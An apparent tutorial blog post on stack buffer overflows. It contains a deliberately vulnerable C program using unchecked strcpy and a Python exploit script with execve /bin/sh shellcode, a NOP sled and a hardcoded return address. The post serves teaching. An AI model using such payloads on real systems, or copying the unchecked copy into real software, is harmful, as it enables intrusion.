12:T9af,<h1>Stack Buffer Overflow Exploitation: The Basics</h1>
<p>Buffer overflows remain one of the most fundamental vulnerabilities in software security. In this post, we'll cover the basics of stack-based buffer overflows.</p>
<h2>Understanding the Stack</h2>
<p>The stack grows downward in memory (from high to low addresses). When a function is called:</p>
<pre><code>+------------------+ Higher addresses
|   Return Addr    |
+------------------+
|   Saved EBP      |
+------------------+
|   Local Vars     |
+------------------+
|   Buffer         |
+------------------+ Lower addresses
</code></pre>
<h2>Vulnerable Code</h2>
<p>Consider this classic vulnerable program:</p>
<pre><code class="language-c">#include &#x3C;stdio.h>
#include &#x3C;string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable(argv[1]);
    }
    return 0;
}
</code></pre>
<h2>Finding the Offset</h2>
<p>We can use a cyclic pattern to find the exact offset to EIP:</p>
<pre><code class="language-bash">$ pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5...

$ ./vuln $(pattern_create.rb -l 100)
Segmentation fault

$ dmesg | tail -1
[12345.678] vuln[1234]: segfault at 41346141
</code></pre>
<h2>Crafting the Exploit</h2>
<pre><code class="language-python">#!/usr/bin/env python3
import struct

# Offset to EIP
offset = 76

# Return address (pointing to our shellcode)
ret_addr = struct.pack("&#x3C;I", 0xbffff7a0)

# NOP sled
nop_sled = b"\x90" * 16

# Shellcode (execve /bin/sh)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
)

payload = b"A" * offset + ret_addr + nop_sled + shellcode
print(payload)
</code></pre>
<h2>Modern Protections</h2>
<p>Modern systems employ several protections:</p>
<ul>
<li><strong>ASLR</strong>: Randomizes memory addresses</li>
<li><strong>DEP/NX</strong>: Prevents code execution on the stack</li>
<li><strong>Stack Canaries</strong>: Detect stack corruption</li>
<li><strong>PIE</strong>: Position Independent Executables</li>
</ul>
<h2>Conclusion</h2>
<p>Understanding buffer overflows is crucial for both offense and defense. While modern protections make exploitation harder, the fundamental concepts remain relevant.</p>
<blockquote>
<p>"To defeat your enemy, you must first understand them." - Sun Tzu (probably)</p>
</blockquote>
<p>Happy hacking!</p>
